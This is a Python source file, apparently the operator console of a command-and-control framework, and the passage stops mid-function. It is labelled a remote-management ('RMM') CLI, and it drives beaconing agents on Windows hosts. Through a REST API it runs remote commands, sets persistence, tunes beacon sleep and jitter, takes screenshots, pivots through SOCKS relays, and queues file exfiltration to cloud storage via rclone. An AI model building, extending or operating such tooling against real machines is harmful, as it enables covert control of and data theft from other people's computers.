#!/usr/bin/env python3
"""
RMM operator CLI — talks to the server REST API (/api/v1/).

Interactive (default):
  python rmm_cli.py
  python rmm_cli.py -i

One-shot / scripting:
  python rmm_cli.py sessions list
  python rmm_cli.py session use abc12345
  python rmm_cli.py exec whoami --wait 120
"""

from __future__ import annotations

import argparse
import base64
import glob
import json
import os
import queue
import socket
import sys
import threading
import time
import urllib.error
import urllib.request
from pathlib import Path

# Line-buffered stdout so Exegol/Docker terminals show output immediately
if hasattr(sys.stdout, "reconfigure"):
    try:
        sys.stdout.reconfigure(line_buffering=True)
    except Exception:
        pass

try:
    import readline
except ImportError:
    readline = None

try:
    from prompt_toolkit.completion import Completer as _PTCompleterBase
except ImportError:
    _PTCompleterBase = object

RMM_CLI_COMMANDS = [
    "list",
    "use",
    "info",
    "background",
    "kill",
    "set_sleep",
    "set_jitter",
    "show_config",
    "download",
    "exfil",
    "rclone-config",
    "upload",
    "screenshot",
    "socks",
    "events",
    "exec",
    "persist",
    "stop",
    "run",
    "health",
    "help",
    "?",
    "clear",
    "quit",
    "exit",
]

def _default_server_url() -> str:
    """Operator CLI URL: RMM_SERVER_URL, else same as beacon client (RMM_BASE_URL)."""
    for key in ("RMM_SERVER_URL", "RMM_BASE_URL"):
        val = os.environ.get(key, "").strip().rstrip("/")
        if val:
            return val
    return "http://127.0.0.1:8080"


DEFAULT_URL = _default_server_url()
DEFAULT_TOKEN = os.environ.get("RMM_API_TOKEN", "").strip()
STATE_FILE = os.path.expanduser("~/.rmm_cli_state.json")
HISTORY_FILE = os.path.expanduser("~/.rmm_cli_history")
# Interactive mode: prompt_toolkit + patch_stdout (input line fixed at bottom).
_cli_use_ptk = False
_cli_output_queue: queue.Queue = queue.Queue()
_cli_output_lock = threading.Lock()
_main_thread_id: int | None = None
OUTPUT_DRAIN_INTERVAL = 0.15
EVENT_POLL_INTERVAL = 1.0


class RmmApiClient:
    def __init__(self, base_url: str, token: str = ""):
        self.base_url = base_url.rstrip("/")
        self.token = token.strip()

    def _headers(self, extra: dict | None = None) -> dict:
        h = {"Accept": "application/json"}
        if self.token:
            h["Authorization"] = f"Bearer {self.token}"
        if extra:
            h.update(extra)
        return h

    def request(self, method: str, path: str, body: dict | None = None, timeout: float = 30):
        url = f"{self.base_url}{path}"
        data = None
        headers = self._headers()
        if body is not None:
            data = json.dumps(body).encode("utf-8")
            headers["Content-Type"] = "application/json"
        req = urllib.request.Request(url, data=data, headers=headers, method=method)
        try:
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                raw = resp.read().decode(errors="replace")
                if not raw.strip():
                    return resp.status, {}
                return resp.status, json.loads(raw)
        except urllib.error.HTTPError as e:
            raw = e.read().decode(errors="replace")
            try:
                payload = json.loads(raw) if raw.strip() else {}
            except json.JSONDecodeError:
                payload = {"error": raw or e.reason}
            return e.code, payload
        except urllib.error.URLError as e:
            return 0, {"error": "connection_failed", "detail": str(e.reason)}
        except (TimeoutError, socket.timeout):
            return 0, {"error": "timeout", "detail": "request timed out"}

    def health(self, timeout: float = 5):
        return self.request("GET", "/api/v1/health", timeout=timeout)

    def list_sessions(self):
        return self.request("GET", "/api/v1/sessions")

    def get_session(self, session_id: str):
        return self.request("GET", f"/api/v1/sessions/{session_id}")

    def kill_session(self, session_id: str):
        return self.request("DELETE", f"/api/v1/sessions/{session_id}")

    def queue_command(self, session_id: str, command: str, cmd_type: str = "oneshot"):
        return self.request(
            "POST",
            f"/api/v1/sessions/{session_id}/commands",
            {"command": command, "type": cmd_type},
        )

    def exec_command(self, session_id: str, command: str, timeout: float = 120):
        return self.request(
            "POST",
            f"/api/v1/sessions/{session_id}/exec",
            {"command": command, "timeout": timeout},
            timeout=timeout + 5,
        )

    def patch_config(self, session_id: str, sleep_seconds=None, jitter_percent=None):
        body = {}
        if sleep_seconds is not None:
            body["sleep_seconds"] = sleep_seconds
        if jitter_percent is not None:
            body["jitter_percent"] = jitter_percent
        return self.request("PATCH", f"/api/v1/sessions/{session_id}/config", body)

    def upload_file(self, session_id: str, local_path: str, remote_path: str):
        content = base64.b64encode(Path(local_path).read_bytes()).decode()
        return self.request(
            "POST",
            f"/api/v1/sessions/{session_id}/upload",
            {"content_b64": content, "remote_path": remote_path},
        )

    def get_events(self, session_id: str, since: int = 0, limit: int = 50):
        return self.request(
            "GET",
            f"/api/v1/sessions/{session_id}/events?since={since}&limit={limit}",
        )

    def queue_download(self, session_id: str, remote_path: str):
        return self.request(
            "POST",
            f"/api/v1/sessions/{session_id}/download",
            {"remote_path": remote_path},
        )

    def queue_exfil(
        self,
        session_id: str,
        remote_path: str,
        profile: str | None = None,
        dest: str | None = None,
    ):
        body: dict = {"remote_path": remote_path}
        if profile:
            body["profile"] = profile
        if dest:
            body["dest"] = dest
        return self.request(
            "POST",
            f"/api/v1/sessions/{session_id}/exfil",
            body,
        )

    def get_rclone_config(self):
        return self.request("GET", "/api/v1/rclone/config")

    def queue_screenshot(self, session_id: str):
        return self.request(
            "POST",
            f"/api/v1/sessions/{session_id}/screenshot",
            {},
        )

    def start_socks(self, session_id: str, port: int = 1080, bind_host: str = "127.0.0.1"):
        return self.request(
            "POST",
            f"/api/v1/sessions/{session_id}/socks",
            {"port": port, "bind_host": bind_host},
        )

    def stop_socks(self, session_id: str):
        return self.request(
            "POST",
            f"/api/v1/sessions/{session_id}/socks",
            {"stop": True},
        )

    def list_socks(self):
        return self.request("GET", "/api/v1/socks")

    def list_history(self):
        return self.request("GET", "/api/v1/history")

    def get_history_session(self, session_ref: str):
        return self.request("GET", f"/api/v1/history/{session_ref}")

    def get_history_events(self, session_ref: str, since: int = 0, limit: int = 500):
        return self.request(
            "GET",
            f"/api/v1/history/{session_ref}/events?since={since}&limit={limit}",
        )

    def delete_history(self, session_ref: str):
        return self.request("DELETE", f"/api/v1/history/{session_ref}")

    def list_session_downloads(self, session_ref: str):
        return self.request("GET", f"/api/v1/sessions/{session_ref}/downloads")

    def get_agent_script(self):
        return self.request("GET", "/api/v1/agent/script")


def load_state() -> dict:
    if os.path.exists(STATE_FILE):
        with open(STATE_FILE, encoding="utf-8") as f:
            return json.load(f)
    return {}


def save_state(state: dict):
    with open(STATE_FILE, "w", encoding="utf-8") as f:
        json.dump(state, f, indent=2)


def current_session(state: dict) -> str | None:
    return state.get("current_session")


def set_current_session(state: dict, session_id: str):
    state["current_session"] = session_id
    save_state(state)


def _ptk_emit(msg: str, *, err: bool = False) -> None:
    from prompt_toolkit import print_formatted_text
    from prompt_toolkit.formatted_text import ANSI

    with _cli_output_lock:
        if not msg:
            print_formatted_text("")
            return
        text = f"\x1b[91m{msg}\x1b[0m" if err else msg
        print_formatted_text(ANSI(text))


def _drain_cli_output() -> None:
    from prompt_toolkit import print_formatted_text
    from prompt_toolkit.formatted_text import ANSI

    with _cli_output_lock:
        while True:
            try:
                msg, err = _cli_output_queue.get_nowait()
            except queue.Empty:
                break
            if not msg:
                print_formatted_text("")
                continue
            text = f"\x1b[91m{msg}\x1b[0m" if err else msg
            print_formatted_text(ANSI(text))


def _output_drainer_loop(state: dict) -> None:
    """Flush queued agent/operator lines while the prompt is active (no Enter required)."""
    while state.get("interactive_running"):
        _drain_cli_output()
        time.sleep(OUTPUT_DRAIN_INTERVAL)


def say(msg: str = "", *, err: bool = False):
    if _cli_use_ptk:
        if _main_thread_id is not None and threading.current_thread().ident != _main_thread_id:
            _cli_output_queue.put((msg, err))
            return
        _ptk_emit(msg, err=err)
        return
    stream = sys.stderr if err else sys.stdout
    print(msg, file=stream)
    stream.flush()


def die(msg: str, code: int = 1):
    say(msg, err=True)
    sys.exit(code)


def warn(msg: str):
    say(msg, err=True)


def ensure_client(url: str, token: str) -> tuple:
    """Verify server reachability and API auth (operator token, not RMM_BEACON_SECRET)."""
    url = (url or _default_server_url()).strip().rstrip("/")
    token = (token or "").strip()
    client = RmmApiClient(url, token)

    say(f"Connecting to {url} ...")
    if not token:
        say("  (no RMM_API_TOKEN — required unless server was started with --insecure)", err=True)
    code, data = client.health(timeout=5)

    if code == 0:
        detail = data.get("detail") or data.get("error") or "unknown error"
        die(
            f"Cannot connect to {url}\n"
            f"  {detail}\n"
            f"  Start the server: python server_rmm.py\n"
            f"  Exegol/Docker: use host IP or host.docker.internal, not 127.0.0.1\n"
            f"  Example: export RMM_SERVER_URL=http://host.docker.internal:8080"
        )

    if code == 401:
        if not token:
            die(
                f"API authentication required by {url}\n"
                f"  The PowerShell client uses RMM_BEACON_SECRET — that is NOT enough for this CLI.\n"
                f"  export RMM_API_TOKEN='same-as-server'  # server --token / RMM_API_TOKEN\n"
                f"  export RMM_SERVER_URL='{url}'  # or RMM_BASE_URL (same URL as the .ps1 client)\n"
                f"  python rmm_cli.py --url \"$RMM_SERVER_URL\" --token \"$RMM_API_TOKEN\""
            )
        die(
            f"API authentication failed (401) against {url}\n"
            f"  RMM_API_TOKEN must match server_rmm.py --token (not RMM_BEACON_SECRET)"
        )

    if code != 200:
        die(f"Server returned HTTP {code}: {data}")

    return client, data


def _session_matches_focus(state: dict, session_id: str) -> bool:
    """When a session is selected, show only its transcript (ordered queue/results)."""
    cur = current_session(state)
    if not cur:
        return True
    if session_id == cur:
        return True
    return session_id.startswith(cur) or cur.startswith(session_id[:8])


def _operator_label(body: str) -> str:
    b = body.strip()
    if ":" in b:
        action, cmd = b.split(":", 1)
        action = action.strip().capitalize()
        cmd = cmd.strip()
        return f"{action}: {cmd}" if cmd else action
    return b


def print_event(
    ev: dict,
    json_mode: bool = False,
    session_prefix: str | None = None,
    session_id: str | None = None,
    state: dict | None = None,
):
    if json_mode:
        print_json(ev)
        return
    if state is not None and session_id and not _session_matches_focus(state, session_id):
        return

    tag = f"[{session_prefix}] " if session_prefix else ""
    ev_type = ev.get("type", "output")
    body = (ev.get("body") or "").strip()
    cmd_echo = (ev.get("command") or "").strip()

    if ev_type == "config_ack":
        say("")
        say(f"[+] {tag}Config applied on agent")
        if body:
            say(f"    {body}")
        return

    if ev_type == "operator":
        say("")
        say(f"[>] {tag}{_operator_label(body)}")
        return

    if ev_type == "output":
        if cmd_echo:
            say(f"    └─ {tag}{cmd_echo}")
        if body:
            for line in body.splitlines():
                say(f"       {tag}{line}")
        else:
            say(f"       {tag}(no output)")
        return

    say("")
    say(f"[{ev['id']}] {tag}{ev_type}" + (f" » {cmd_echo}" if cmd_echo else ""))
    if body:
        for line in body.splitlines():
            say(f"    {tag}{line}")


def _event_cursor(state: dict) -> dict[str, int]:
    return state.setdefault("last_event_by_session", {})


def _sync_event_cursor(client: RmmApiClient, state: dict, session_id: str) -> None:
    """Skip historical events when selecting a session (only show new activity)."""
    code, data = client.get_events(session_id, since=0, limit=500)
    cursor = _event_cursor(state)
    if code == 200:
        events = data.get("events", [])
        cursor[session_id] = max((e["id"] for e in events), default=0)
    else:
        cursor.setdefault(session_id, 0)


def session_or_none(state: dict, session_arg: str | None = None) -> str | None:
    return session_arg or current_session(state)


def require_session(state: dict, session_arg: str | None) -> str:
    sid = session_or_none(state, session_arg)
    if not sid:
        die("No session selected. Run: rmm_cli.py session use <id>")
    return sid


def print_json(data):
    print(json.dumps(data, indent=2))


def cmd_health(client: RmmApiClient, args):
    code, data = client.health()
    if args.json:
        print_json({"status": code, **data})
    elif code == 200:
        print(f"ok ({data.get('sessions', 0)} sessions)")
    else:
        die(f"health failed ({code}): {data}")


def cmd_sessions_list(client: RmmApiClient, args):
    code, data = client.list_sessions()
    if code != 200:
        die(f"sessions list failed ({code}): {data}")
    if args.json:
        print_json(data)
        return
    sessions = data.get("sessions", [])
    if not sessions:
        print("No active sessions")
        return
    print(f"{'ID':<10} {'User':<15} {'Host':<20} {'Sleep':<8} {'Jitter':<8} {'Last seen':<12} {'Status':<8}")
    print("-" * 95)
    for s in sessions:
        ago, status = _session_last_seen_display(s)
        print(
            f"{s['id'][:8]:<10} {s['username']:<15} {s['hostname']:<20} "
            f"{s['sleep_seconds']:<8} {s['jitter_percent']:<7}% "
            f"{ago:<12} {status:<8}"
        )


def cmd_session_use(client: RmmApiClient, state: dict, args):
    code, data = client.get_session(args.session_id)
    if code != 200:
        die(f"session not found ({code}): {data}")
    sid = data["session"]["id"]
    set_current_session(state, sid)
    s = data["session"]
    print(f"Selected {s['username']}@{s['hostname']} [{sid[:8]}]")


def cmd_session_info(client: RmmApiClient, state: dict, args):
    sid = require_session(state, args.session)
    code, data = client.get_session(sid)
    if code != 200:
        die(f"session info failed ({code}): {data}")
    if args.json:
        print_json(data)
    else:
        s = data["session"]
        for k, v in s.items():
            print(f"  {k}: {v}")


def cmd_session_kill(client: RmmApiClient, state: dict, args):
    sid = require_session(state, args.session)
    code, data = client.kill_session(sid)
    if code != 200:
        die(f"kill failed ({code}): {data}")
    if state.get("current_session") == data.get("session_id"):
        state.pop("current_session", None)
        save_state(state)
    print(f"Killed session {data.get('session_id', sid)[:8]}")


def cmd_run(client: RmmApiClient, state: dict, args):
    sid = require_session(state, args.session)
    code, data = client.queue_command(sid, args.command, args.type)
    if code != 200:
        die(f"queue failed ({code}): {data}")
    if args.json:
        print_json(data)
    else:
        print("Command queued")


def cmd_exec(client: RmmApiClient, state: dict, args):
    sid = require_session(state, args.session)
    command = args.command
    if not command and args.command_file:
        command = Path(args.command_file).read_text(encoding="utf-8").strip()
    if not command:
        die("Missing command")
    say(f"Waiting for agent (up to {args.wait:.0f}s)...")
    code, data = client.exec_command(sid, command, timeout=args.wait)
    if code == 408:
        die(f"timeout after {args.wait}s", 2)
    if code != 200:
        die(f"exec failed ({code}): {data}")
    ev = data.get("event", {})
    if args.json:
        print_json(ev)
        return
    if ev.get("command"):
        print(f"[{ev.get('type')}] {ev['command']}")
    body = ev.get("body", "")
    if ev.get("artifact"):
        print(f"artifact: {ev['artifact']}")
    print(body)


def cmd_config_set_sleep(client: RmmApiClient, state: dict, args):
    sid = require_session(state, args.session)
    code, data = client.patch_config(sid, sleep_seconds=args.seconds)
    if code != 200:
        die(f"config failed ({code}): {data}")
    print(f"Sleep set to {args.seconds}s on server (watch interactive output for [config_ack] from agent)")


def cmd_config_set_jitter(client: RmmApiClient, state: dict, args):
    sid = require_session(state, args.session)
    code, data = client.patch_config(sid, jitter_percent=args.percent)
    if code != 200:
        die(f"config failed ({code}): {data}")
    print(f"Jitter set to {args.percent}% on server (watch interactive output for [config_ack] from agent)")


def cmd_download(client: RmmApiClient, state: dict, args):
    sid = require_session(state, args.session)
    code, data = client.queue_download(sid, args.remote_path)
    if code != 200:
        die(f"download queue failed ({code}): {data}")
    print("Download queued — check server RMM_logs/downloads/ or poll events")


def cmd_exfil(client: RmmApiClient, state: dict, args):
    sid = require_session(state, args.session)
    code, data = client.queue_exfil(
        sid,
        args.remote_path,
        profile=getattr(args, "profile", None),
        dest=getattr(args, "dest", None),
    )
    if code != 200:
        die(f"exfil queue failed ({code}): {data}")
    profile = data.get("profile") if isinstance(data, dict) else None
    if profile:
        print(f"Profile: {profile}")
    print("Exfil queued — poll events for cloud link or destination path")


def _print_rclone_config(data: dict) -> None:
    if data.get("load_error"):
        print(f"Profile load error: {data['load_error']}")
    bin_ok = "yes" if data.get("rclone_binary") else "no"
    print(f"Upload from: agent  rclone on server: {bin_ok}  max_bytes: {data.get('max_bytes')}")
    print(f"Default profile: {data.get('default_profile')}")
    profiles = data.get("profiles") or []
    if not profiles:
        print("No rclone profiles configured (RMM_RCLONE_PROFILES or RMM_RCLONE_PROFILES_FILE)")
    for p in profiles:
        name = p.get("name") or "?"
        ptype = p.get("type") or "?"
        folder = p.get("folder") or "/"
        print(f"  - {name} ({ptype}) folder={folder}")


def cmd_rclone_config(client: RmmApiClient, state: dict, args):
    code, data = client.get_rclone_config()
    if code != 200:
        die(f"rclone config failed ({code}): {data}")
    if getattr(args, "json", False):
        print(json.dumps(data, indent=2))
        return
    _print_rclone_config(data)


def cmd_upload(client: RmmApiClient, state: dict, args):
    sid = require_session(state, args.session)
    if not os.path.isfile(args.local):
        die(f"Local file not found: {args.local}")
    code, data = client.upload_file(sid, args.local, args.remote)
    if code != 200:
        die(f"upload failed ({code}): {data}")
    print(f"Upload queued: {args.local} -> {args.remote}")


def print_socks_relays(relays: list, *, json_mode: bool = False) -> None:
    if json_mode:
        print(json.dumps({"count": len(relays), "relays": relays}, indent=2))
        return
    if not relays:
        say("No active SOCKS relays")
        return
    for r in relays:
        host = r.get("hostname")
        user = r.get("username")
        agent = f"{user}@{host}" if host else r.get("session_id", "?")[:8]
        sid = r.get("session_id", "")[:8]
        url = r.get("socks_url", "")
        ch = r.get("agent_channel", "?")
        ws = "yes" if r.get("agent_websocket") else "no"
        tunnels = r.get("active_tunnels", 0)
        beacon = r.get("beacon_status", "?")
        say(
            f"{url}  →  {agent}  [session {sid}]  "
            f"channel={ch}  ws={ws}  tunnels={tunnels}  beacon={beacon}"
        )


def cmd_socks_list(client: RmmApiClient, state: dict, args):
    code, data = client.list_socks()
    if code != 200:
        die(f"socks list failed ({code}): {data}")
    print_socks_relays(data.get("relays", []), json_mode=getattr(args, "json", False))


def _resolve_session_id(client: RmmApiClient, state: dict, prefix: str):
    """Return full session id from prefix via API list."""
    code, data = client.list_sessions()
    if code != 200:
        return None
    matches = [s for s in data.get("sessions", []) if s["id"].startswith(prefix)]
    if len(matches) == 1:
        return matches[0]["id"]
    if len(matches) > 1:
        warn(f"Ambiguous session prefix '{prefix}':")
        for s in matches:
            warn(f"  {s['id'][:8]} {s['username']}@{s['hostname']}")
        return None
    code, data = client.get_session(prefix)
    if code == 200:
        return data["session"]["id"]
    return None


def _format_ago(seconds: int) -> str:
    if seconds < 60:
        return f"{seconds}s ago"
    if seconds < 3600:
        return f"{seconds // 60}m ago"
    if seconds < 86400:
        return f"{seconds // 3600}h ago"
    return f"{seconds // 86400}d ago"


def _session_last_seen_display(session: dict) -> tuple[str, str]:
    """Return (ago label, beacon_status) from API session dict."""
    ago_s = session.get("last_seen_ago_seconds")
    status = session.get("beacon_status", "")
    if ago_s is None and session.get("last_seen"):
        try:
            from datetime import datetime

            seen = datetime.fromisoformat(session["last_seen"].replace("Z", "+00:00"))
            if seen.tzinfo:
                seen = seen.replace(tzinfo=None)
            ago_s = int((datetime.now() - seen).total_seconds())
        except Exception:
            ago_s = None
    ago_label = _format_ago(int(ago_s)) if ago_s is not None else "?"
    return ago_label, status or "?"


def _prompt(state: dict) -> str:
    sid = current_session(state)
    tag = f"[{sid[:8]}] " if sid else ""
    return f"RMM {tag}> "


def _show_help():
    help_text = """
Session:  list | use <id> | info | background | kill [id]
Beacon:   set_sleep <seconds> | set_jitter <percent> | show_config
Remote:   <command>  (queue) | exec <command>  (wait) | persist <cmd> | stop
Files:    download <remote> | exfil <remote> [profile] | upload <local> <remote> | screenshot
Config:   rclone-config   (rclone profiles + binary status on server)
Tunnel:   socks list | socks [port] | socks stop   (SOCKS5 on 127.0.0.1, default 1080)
Other:    events [since] | health | help | quit

Tip: agent output and config_ack events stream for all connected sessions (prefix [session8]).
Tip: TAB completes commands and session id prefixes (after list).
Status: online = recent poll; stale = late; offline = likely dead (re-run list to refresh).
""".strip()
    for line in help_text.split("\n"):
        say(line)


def _refresh_completion_sessions(client: "RmmApiClient", state: dict) -> None:
    code, data = client.list_sessions()
    if code == 200:
        sessions = data.get("sessions", [])
        state["_completion_sessions"] = [s["id"][:8] for s in sessions]
    else:
        state.setdefault("_completion_sessions", [])


class RmmCliCompleter:
    """readline tab completion for the interactive operator CLI."""

    def __init__(self, state: dict):
        self.state = state

    def _session_prefixes(self):
        return self.state.get("_completion_sessions") or []

    def complete(self, text, state_index):
        if readline is None:
            return None
        line = readline.get_line_buffer()
        parts = line.split()

        if not parts or (len(parts) == 1 and not line.endswith(" ")):
            matches = [c for c in RMM_CLI_COMMANDS if c.startswith(text)]
            if state_index < len(matches):
                return matches[state_index] + " "
            return None

        cmd = parts[0].lower()

        if cmd in ("use", "kill") and (
            len(parts) == 1 or (len(parts) == 2 and not line.endswith(" "))
        ):
            matches = [p for p in self._session_prefixes() if p.startswith(text)]
            if state_index < len(matches):
                return matches[state_index] + (" " if cmd == "use" else "")
            return None

        if cmd == "upload" and len(parts) == 2 and not line.endswith(" "):
            matches = glob.glob(text + "*")
            if state_index < len(matches):
                return matches[state_index]
            return None

        return None


class RmmCliPTKCompleter(_PTCompleterBase):
    """prompt_toolkit tab completion (preferred when installed)."""

    def __init__(self, state: dict):
        super().__init__()
        self.state = state
        self._words = RmmCliCompleter(state)

    def get_completions(self, document, complete_event):
        from prompt_toolkit.completion import Completion

        line = document.text_before_cursor
        parts = line.split()

        if not parts or (len(parts) == 1 and not line.endswith(" ")):
            prefix = parts[0] if parts else ""
            for cmd in RMM_CLI_COMMANDS:
                if cmd.startswith(prefix):
                    yield Completion(cmd + " ", start_position=-len(prefix))
            return

        cmd = parts[0].lower()

        if cmd in ("use", "kill"):
            if len(parts) == 1 and line.endswith(" "):
                for p in self._words._session_prefixes():
                    yield Completion(p + " ", start_position=0)
                return
            if len(parts) == 2 and not line.endswith(" "):
                prefix = parts[1]
                for p in self._words._session_prefixes():
                    if p.startswith(prefix):
                        yield Completion(p + (" " if cmd == "use" else ""), start_position=-len(prefix))
                return

        if cmd == "upload" and len(parts) == 2 and not line.endswith(" "):
            prefix = parts[1]
            for m in glob.glob(prefix + "*"):
                yield Completion(m, start_position=-len(prefix))
            return


def _event_poller(client: RmmApiClient, state: dict, json_mode: bool):
    cursor = _event_cursor(state)
    while state.get("interactive_running"):
        code, data = client.list_sessions()
        if code == 401:
            state["interactive_running"] = False
            break
        if code == 200:
            for s in data.get("sessions", []):
                sid = s["id"]
                since = cursor.get(sid, 0)
                ec, edata = client.get_events(sid, since=since, limit=100)
                if ec != 200:
                    continue
                prefix = sid[:8]
                events = sorted(
                    (e for e in edata.get("events", []) if e["id"] > since),
                    key=lambda e: e["id"],
                )
                for ev in events:
                    print_event(
                        ev,
                        json_mode,
                        session_prefix=prefix,
                        session_id=sid,
                        state=state,
                    )
                    cursor[sid] = max(cursor.get(sid, 0), ev["id"])
        time.sleep(EVENT_POLL_INTERVAL)


def _active_session(client: RmmApiClient, state: dict) -> str | None:
    sid = session_or_none(state)
    if not sid:
        return None
    code, _ = client.get_session(sid)
    if code == 404:
        warn(f"Session {sid[:8]} no longer active (cleared selection)")
        state.pop("current_session", None)
        save_state(state)
        return None
    if code == 401:
        warn("API token rejected — reconnect (quit and restart with RMM_API_TOKEN)")
        return None
    if code != 200:
        warn(f"Cannot verify session (HTTP {code})")
        return None
    return sid


def run_interactive(
    client: RmmApiClient,
    state: dict,
    json_mode: bool = False,
    start_data: dict | None = None,
):
    try:
        from prompt_toolkit import PromptSession
        from prompt_toolkit.history import FileHistory
        from prompt_toolkit.patch_stdout import patch_stdout
    except ImportError:
        die(
            "Interactive mode requires prompt_toolkit (fixed input line at the bottom).\n"
            "  pip install -r requirements.txt"
        )

    data = start_data or {}
    _refresh_completion_sessions(client, state)

    global _cli_use_ptk, _main_thread_id
    _cli_use_ptk = True
    _main_thread_id = threading.current_thread().ident

    ptk_session = PromptSession(
        history=FileHistory(HISTORY_FILE),
        completer=RmmCliPTKCompleter(state),
        complete_style="COLUMN",
        enable_history_search=True,
    )

    state["interactive_running"] = True
    _event_cursor(state)

    def _interactive_loop():
        while True:
            _drain_cli_output()
            try:
                line = ptk_session.prompt(
                    _prompt(state),
                    refresh_interval=OUTPUT_DRAIN_INTERVAL,
                )
            except EOFError:
                say()
                break
            except KeyboardInterrupt:
                say()
                continue

            if not line.strip():
                continue

            parts = line.strip().split()
            cmd = parts[0].lower()
            rest = parts[1:]

            if cmd in ("quit", "exit"):
                break
            if cmd in ("help", "?"):
                _show_help()
                continue
            if cmd == "clear":
                _ptk_emit("\x1b[2J\x1b[H")
                continue
            if cmd == "health":
                code, hdata = client.health()
                if code == 200:
                    say(f"ok ({hdata.get('sessions', 0)} sessions)")
                else:
                    warn(f"health {code}")
                continue
            if cmd == "list":
                code, sdata = client.list_sessions()
                if code != 200:
                    warn(f"list failed ({code})")
                    continue
                sessions = sdata.get("sessions", [])
                if not sessions:
                    say("No active sessions.")
                    say("  Start the Windows client: $env:RMM_BASE_URL / $env:RMM_BEACON_SECRET then client_rmm.ps1")
                    continue
                say(f"{'ID':<10} {'User':<15} {'Host':<20} {'Sleep':<8} {'Jitter':<8} {'Last seen':<12} {'Status':<8}")
                say("-" * 95)
                for s in sessions:
                    ago, status = _session_last_seen_display(s)
                    say(
                        f"{s['id'][:8]:<10} {s['username']:<15} {s['hostname']:<20} "
                        f"{s['sleep_seconds']:<8} {s['jitter_percent']:<7}% "
                        f"{ago:<12} {status:<8}"
                    )
                _refresh_completion_sessions(client, state)
                continue
            if cmd == "use":
                if not rest:
                    warn("Usage: use <session_id>")
                    continue
                full = _resolve_session_id(client, state, rest[0])
                if not full:
                    warn(f"Session not found: {rest[0]}")
                    continue
                set_current_session(state, full)
                _sync_event_cursor(client, state, full)
                _refresh_completion_sessions(client, state)
                code, sdata = client.get_session(full)
                if code == 200:
                    s = sdata["session"]
                    say(f"Selected {s['username']}@{s['hostname']} [{full[:8]}]")
                continue
            if cmd == "background":
                state.pop("current_session", None)
                save_state(state)
                say("Returned to global view")
                continue
            if cmd == "info" or cmd == "show_config":
                sid = session_or_none(state)
                if not sid:
                    warn("No session selected. Use: use <id>")
                    continue
                code, sdata = client.get_session(sid)
                if code != 200:
                    warn(f"info failed ({code})")
                    continue
                s = sdata["session"]
                for k, v in s.items():
                    say(f"  {k}: {v}")
                if cmd == "show_config":
                    j = s["jitter_percent"] / 100.0
                    lo = s["sleep_seconds"] * (1 - j)
                    hi = s["sleep_seconds"] * (1 + j)
                    say(f"  effective_range: {lo:.1f}s - {hi:.1f}s")
                continue
            if cmd == "kill":
                sid_arg = rest[0] if rest else None
                sid = session_or_none(state, sid_arg)
                if not sid and sid_arg:
                    sid = _resolve_session_id(client, state, sid_arg)
                if not sid:
                    warn("No session to kill")
                    continue
                code, kdata = client.kill_session(sid)
                if code != 200:
                    warn(f"kill failed ({code})")
                    continue
                if state.get("current_session") == kdata.get("session_id", sid):
                    state.pop("current_session", None)
                    save_state(state)
                say(f"Killed {kdata.get('session_id', sid)[:8]}")
                _refresh_completion_sessions(client, state)
                continue
            if cmd == "set_sleep":
                if not rest:
                    warn("Usage: set_sleep <seconds>")
                    continue
                sid = session_or_none(state)
                if not sid:
                    warn("No session selected")
                    continue
                try:
                    sleep_val = int(rest[0])
                except ValueError:
                    warn(f"Invalid number: {rest[0]!r} (use an integer, e.g. set_sleep 5)")
                    continue
                if not 1 <= sleep_val <= 3600:
                    warn("Sleep must be between 1 and 3600 seconds")
                    continue
                code, _ = client.patch_config(sid, sleep_seconds=sleep_val)
                if code == 200:
                    say(f"Sleep -> {sleep_val}s on server (agent applies on next beacon; watch for [config_ack])")
                else:
                    warn(f"failed ({code})")
                continue
            if cmd == "set_jitter":
                if not rest:
                    warn("Usage: set_jitter <percent>")
                    continue
                sid = session_or_none(state)
                if not sid:
                    warn("No session selected")
                    continue
                try:
                    jitter_val = int(rest[0])
                except ValueError:
                    warn(f"Invalid number: {rest[0]!r} (use an integer, e.g. set_jitter 30)")
                    continue
                if not 0 <= jitter_val <= 100:
                    warn("Jitter must be between 0 and 100")
                    continue
                code, _ = client.patch_config(sid, jitter_percent=jitter_val)
                if code == 200:
                    say(f"Jitter -> {jitter_val}% on server (agent applies on next beacon; watch for [config_ack])")
                else:
                    warn(f"failed ({code})")
                continue
            if cmd == "events":
                sid = session_or_none(state)
                if not sid:
                    warn("No session selected")
                    continue
                since = int(rest[0]) if rest else 0
                code, edata = client.get_events(sid, since=since)
                if code != 200:
                    warn(f"events failed ({code})")
                    continue
                cursor = _event_cursor(state)
                for ev in sorted(edata.get("events", []), key=lambda e: e["id"]):
                    print_event(
                        ev,
                        json_mode,
                        session_prefix=sid[:8],
                        session_id=sid,
                        state=state,
                    )
                    cursor[sid] = max(cursor.get(sid, 0), ev["id"])
                continue
            if cmd == "download":
                if not rest:
                    warn("Usage: download <remote_path>")
                    continue
                sid = session_or_none(state)
                if not sid:
                    warn("No session selected")
                    continue
                remote = " ".join(rest)
                code, _ = client.queue_download(sid, remote)
                if code == 200:
                    say("Download queued")
                else:
                    warn(f"failed ({code})")
                continue
            if cmd == "exfil":
                if not rest:
                    warn("Usage: exfil <remote_path> [profile]")
                    continue
                sid = session_or_none(state)
                if not sid:
                    warn("No session selected")
                    continue
                remote = rest[0]
                profile = rest[1] if len(rest) > 1 else None
                code, data = client.queue_exfil(sid, remote, profile=profile)
                if code == 200:
                    say("Exfil queued")
                elif code == 503 and isinstance(data, dict) and data.get("error"):
                    warn(str(data["error"]))
                else:
                    warn(f"failed ({code})")
                continue
            if cmd == "rclone-config":
                code, data = client.get_rclone_config()
                if code != 200:
                    warn(f"failed ({code})")
                elif isinstance(data, dict):
                    if data.get("rclone_binary"):
                        say(f"rclone binary ready; default profile={data.get('default_profile')}")
                    else:
                        warn("rclone.exe not on server — see tools/rclone/README.md")
                    for p in data.get("profiles") or []:
                        say(f"  {p.get('name')} ({p.get('type')}) folder={p.get('folder') or '/'}")
                continue
            if cmd == "upload":
                if len(rest) < 2:
                    warn("Usage: upload <local_file> <remote_path>")
                    continue
                sid = session_or_none(state)
                if not sid:
                    warn("No session selected")
                    continue
                local, remote = rest[0], " ".join(rest[1:])
                if not os.path.isfile(local):
                    warn(f"Not found: {local}")
                    continue
                code, _ = client.upload_file(sid, local, remote)
                if code == 200:
                    say(f"Upload queued -> {remote}")
                else:
                    warn(f"failed ({code})")
                continue
            if cmd == "screenshot":
                sid = session_or_none(state)
                if not sid:
                    warn("No session selected")
                    continue
                code, _ = client.queue_screenshot(sid)
                if code == 200:
                    say("Screenshot queued")
                else:
